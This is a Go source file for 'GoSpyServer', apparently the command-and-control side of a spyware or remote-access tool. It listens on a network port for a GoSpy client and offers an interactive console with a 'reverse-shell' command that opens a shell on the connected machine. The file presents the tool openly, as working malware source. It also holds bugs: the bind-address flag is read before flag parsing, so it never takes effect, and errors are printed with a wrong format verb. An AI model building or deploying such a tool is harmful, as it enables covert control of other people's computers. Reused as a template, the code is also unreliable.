package main

import (
	"flag"
	"fmt"
	"github.com/c-bata/go-prompt"
	"github.com/psidex/GoSpy/internal/gospyserver/client"
	"github.com/psidex/GoSpy/internal/gospyserver/serverprompt"
	"os"
	"strings"
)

// ToDo: What happens if the client drops and/or becomes un-responsive?

const banner = `
   ___     ___             ___                      
  / __|___/ __|_ __ _  _  / __| ___ _ ___ _____ _ _ 
 | (_ / _ \__ \ '_ \ || | \__ \/ -_) '_\ V / -_) '_|
  \___\___/___/ .__/\_, | |___/\___|_|  \_/\___|_|  
              |_|   |__/              v0.0.1`

var spyClient client.GoSpyClient

func executor(in string) {
	in = strings.TrimSpace(in)
	blocks := strings.Split(in, " ")

	switch blocks[0] {

	case "exit":
		fmt.Println("Exiting")
		os.Exit(0)

	case "ping":
		resp, err := spyClient.Ping()
		if err != nil {
			fmt.Printf("Ping error: %e\n", err)
			break
		}
		fmt.Printf("Recv: %s\n", resp)

	case "reverse-shell":
		err := spyClient.EnterReverseShellRepl()
		if err != nil {
			fmt.Printf("Reverse shell error: %e\n", err)
		}

	}
}

func main() {
	address := *flag.String("b", "0.0.0.0:12345", "the address (ip:port) to bind the gospyserver to")

	fmt.Println(banner)
	fmt.Printf("\nListening on %s\n", address)
	fmt.Println("Waiting for connection from GoSpy client...")

	var err error // So we don't assign a local spyClient using := below.
	spyClient, err = client.GetGoSpyClient(address)
	if err != nil {
		fmt.Printf("Error when client tried to connect: %e\n", err)
		os.Exit(0)
	}

	fmt.Println("Successful connection")
	p := prompt.New(
		executor,
		serverprompt.Completer,
		prompt.OptionTitle("GoSpyServer"),
	)
	p.Run()
}
